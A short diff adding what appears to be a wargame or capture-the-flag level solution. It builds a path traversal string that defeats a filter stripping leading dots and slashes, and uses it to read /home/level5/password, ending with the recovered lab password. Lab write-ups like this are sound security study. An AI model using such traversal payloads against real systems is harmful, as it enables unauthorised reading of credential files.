@@ -1,0 +1,18 @@
+Our string contains these components.
+The first line stops the loop which strips . and / from the beginning.
+
+lyrics/
+/.././.././
+/.././.././
+/.././.././
+/.././.././
+home
+/level5
+/password
+
+Our "attack" string:
+
+./shared lyrics//.././.././/.././.././/.././.././/.././.././home/level5/password
+
+Password is:
+Traveller
